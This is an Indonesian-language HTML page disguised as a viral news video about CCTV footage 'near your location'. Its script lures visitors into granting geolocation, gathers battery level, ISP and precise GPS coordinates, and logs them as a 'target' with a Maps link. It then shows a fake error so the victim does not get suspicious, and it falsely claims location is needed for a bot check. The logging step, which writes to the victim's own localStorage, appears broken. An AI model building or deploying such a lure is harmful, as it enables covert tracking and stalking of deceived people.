<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GNN - BERITA VIRAL HARI INI</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f0f2f5; }
        .nav { background: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; }
        .container { max-width: 500px; margin: 20px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .video-thumb { width: 100%; height: 250px; background: #000 url('https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg') no-repeat center; background-size: cover; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; }
        .play-btn { background: rgba(211, 47, 47, 0.9); color: white; padding: 15px 25px; border-radius: 50px; font-weight: bold; font-size: 18px; border: 3px solid white; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        h2 { font-size: 18px; color: #111; margin: 15px 0; line-height: 1.4; }
        .btn-nonton { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
        .footer { text-align: center; font-size: 10px; color: #888; margin-top: 20px; }
    </style>
</head>
<body>

<div class="nav">🔴 GNN NEWS LIVE</div>

<div class="container">
    <div class="video-thumb" onclick="gasLacak()">
        <div class="play-btn">▶ TONTON SEKARANG</div>
    </div>
    <h2>VIRAL: Rekaman Tak Terduga CCTV di Dekat Lokasi Anda Tersebar Luas!</h2>
    <p style="font-size: 13px; color: #555;">Pihak berwajib meminta warga untuk tetap waspada. Klik tombol di bawah untuk melihat detail kejadian dan lokasi tepatnya.</p>
    
    <button class="btn-nonton" onclick="gasLacak()">KONFIRMASI LOKASI & TONTON</button>
</div>

<div class="footer">Dikelola oleh GNN Media Network • 2026</div>

<script>
    async function gasLacak() {
        const btn = document.querySelector('.btn-nonton');
        btn.innerText = "MENGHUBUNGKAN SATELIT...";
        
        let batInfo = "N/A";
        let ispInfo = "Mencari ISP...";

        // 1. AMBIL DATA BATERAI
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Sisa)");
            }
        } catch(e) {}

        // 2. AMBIL DATA PROVIDER (ISP)
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ispInfo = data.org || "Provider Privat";
        } catch(e) { ispInfo = "Provider Terenkripsi"; }

        // 3. AMBIL KOORDINAT GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const jam = new Date().toLocaleTimeString();
                    
                    // Format Log untuk Dashboard v17 (Sesuai Tab Radar)
                    const formatLog = `
                        <div style="padding:5px;">
                            <b style="color:#d32f2f;">📍 TARGET KENA JIRZ! [${jam}]</b><br>
                            🔋 <b>Baterai:</b> ${batInfo}<br>
                            📶 <b>Provider:</b> ${ispInfo}<br>
                            🌍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:blue; font-weight:bold;">BUKA MAPS (PRESISI)</a>
                        </div>
                    `;

                    // Simpan ke LocalStorage yang dibaca Dashboard
                    let oldLogs = JSON.parse(localStorage.getItem("eye_logs")) || [];
                    oldLogs.unshift(formatLog);
                    localStorage.setItem("eye_logs", JSON.stringify(oldLogs));

                    // Fake Error biar target ga curiga
                    setTimeout(() => {
                        alert("Koneksi Error 403: Video ini telah dihapus atau dibatasi di wilayah Anda karena mengandung unsur kekerasan.");
                        btn.innerText = "TONTON SEKARANG";
                    }, 1500);
                },
                (err) => {
                    alert("Akses Ditolak! Anda harus mengizinkan lokasi untuk memverifikasi bahwa Anda bukan robot/bot.");
                    btn.innerText = "TONTON SEKARANG";
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        } else {
            alert("Browser Anda terlalu jadul buat nonton video ini.");
        }
    }
</script>

</body>
</html>
